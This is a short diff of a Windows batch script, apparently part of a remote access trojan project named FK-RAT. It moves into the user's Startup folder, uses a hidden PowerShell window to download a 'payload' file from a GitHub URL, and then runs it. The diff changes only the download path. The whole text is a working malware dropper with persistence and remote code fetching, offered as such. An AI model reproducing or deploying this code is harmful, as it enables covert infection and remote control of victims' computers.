@@ -11,7 +11,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd "%STARTUP%"
 
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/wget.cmd -OutFile wget.cmd" 
 
 @REM run payload
 powershell ./wget.cmd
